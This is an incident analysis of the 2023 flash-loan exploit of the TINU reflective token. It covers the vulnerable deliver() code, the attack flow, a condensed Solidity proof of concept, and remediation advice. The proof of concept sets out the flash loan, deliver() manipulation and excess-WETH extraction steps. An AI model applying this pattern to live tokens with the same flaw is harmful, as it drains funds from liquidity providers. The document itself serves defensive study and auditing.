# TINU (Tom Inu) — Reflective Token deliver() + Balancer Flash Loan Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2023-01-25 |
| **Protocol** | TINU (Tom Inu) Token |
| **Chain** | Ethereum |
| **Loss** | 22 ETH |
| **Attacker** | [0x14d8ada7...](https://etherscan.io/address/0x14d8ada7a0ba91f59dc0cb97c8f44f1d177c2195) |
| **Attack Tx** | [0x6200bf5c...](https://etherscan.io/tx/0x6200bf5c43c214caa1177c3676293442059b4f39eb5dbae6cfd4e6ad16305668) |
| **Vulnerable Contract** | [0x2d0e64b6...](https://etherscan.io/address/0x2d0e64b6bf13660a4c0de42a0b88144a7c10991f) |
| **Root Cause** | Reflective ERC-20 `deliver()` function allows LP balance manipulation |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-01/TINU_exp.sol) |

---
## 1. Vulnerability Overview

TINU is a token that uses the same reflective ERC-20 pattern as SHOCO. The attacker (address 0x14d8ada7, identical to the SHOCO attacker) borrowed a large amount of WETH via a Balancer flash loan, purchased TINU, then manipulated the LP pair's reflection ratio using the `deliver()` function to extract excess WETH through a UniswapV2 swap.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Core vulnerable pattern of reflective tokens
interface reflectiveERC20 {
    function deliver(uint256 amount) external;
    // When deliver() is called:
    // _rOwned[sender] -= rAmount
    // _rTotal -= rAmount  ← changes the global ratio
    // LP pair's _rOwned remains unchanged, but
    // currentRate (= _rTotal / _tTotal) decreases
    // → tokenFromReflection(pairROwned) = pairROwned / currentRate increases
}

// UniswapV2 pair swap function
// ❌ Output amount is calculated based on reserves,
// but if actual balance exceeds reserve, extra tokens are transferred
function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external {
    require(amount0Out > 0 || amount1Out > 0);
    (uint112 _reserve0, uint112 _reserve1,) = getReserves();
    // ❌ balance0 = IERC20(token0).balanceOf(address(this))
    // After deliver(): balance0 > _reserve0 → additional profit possible
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: TomInu.sol
        function deliver(uint256 tAmount) public {  // ❌
            address sender = _msgSender();
            require(!_isExcluded[sender], "Excluded addresses cannot call this function");
            (uint256 rAmount,,,,,) = _getValues(tAmount);
            _rOwned[sender] = _rOwned[sender].sub(rAmount);
            _rTotal = _rTotal.sub(rAmount);
            _tFeeTotal = _tFeeTotal.add(tAmount);
        }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker (0x14d8ada7 — same address as SHOCO attack)
  │
  ├─1─▶ Balancer Vault flash loan (borrow large amount of WETH)
  │
  ├─2─▶ Swap WETH → TINU on UniswapV2 TINU-WETH pair
  │       Purchase large amount of TINU
  │
  ├─3─▶ TINU.deliver(tinu_balance)
  │       _rTotal decreases → reflected balance of TINU-WETH LP increases
  │       LP pair's actual TINU balance > reserve
  │
  ├─4─▶ Extract WETH via UniswapV2 swap
  │       Actual balance > reserve → receive excess WETH
  │
  └─5─▶ Repay Balancer flash loan → net profit 22 ETH
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract TomInuExploit is Test {
    IWETH private constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    reflectiveERC20 private constant TINU = reflectiveERC20(0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F);
    IBalancerVault private constant balancerVault =
        IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    function testExploit() external {
        // Borrow large amount of WETH via Balancer flash loan
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = flashAmount;
        balancerVault.flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(
        IERC20[] memory,
        uint256[] memory amounts,
        uint256[] memory,
        bytes memory
    ) external {
        // 1. Swap WETH → TINU (bulk purchase)
        swapWETHforTINU(amounts[0]);

        // 2. Decrease rTotal via deliver() → LP pair reflected balance increases
        TINU.deliver(TINU.balanceOf(address(this)));

        // 3. Extract excess WETH via swap
        extractExcessWETH();

        // 4. Repay flash loan principal to Balancer
        WETH.transfer(address(balancerVault), amounts[0]);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Reflective token mechanism manipulation |
| **Attack Vector** | Balancer Flash Loan + deliver() + UniswapV2 |
| **Impact Scope** | LP liquidity providers |
| **DASP Classification** | Business Logic Flaw |
| **CWE** | CWE-840: Business Logic Errors |

## 6. Remediation Recommendations

1. **Remove `deliver()` function or block LP interaction**: In reflective tokens paired with AMM LPs, `deliver()` is a fundamental risk factor.
2. **Add LP pair to the excluded list**: Prevents reflection manipulation of the LP pair.
3. **Pattern audit**: BEVO, SHOCO, and TINU all share the same pattern — tokens exhibiting this pattern require immediate auditing.

## 7. Lessons Learned

- The same attacker (0x14d8ada7) targeted TINU following the SHOCO attack. Vulnerable patterns will inevitably be reused.
- Balancer flash loans are preferred in more attacks because they carry a 0% fee.
- The reflective token pattern (`deliver()` + `_rTotal`) must always be assumed vulnerable when combined with UniswapV2.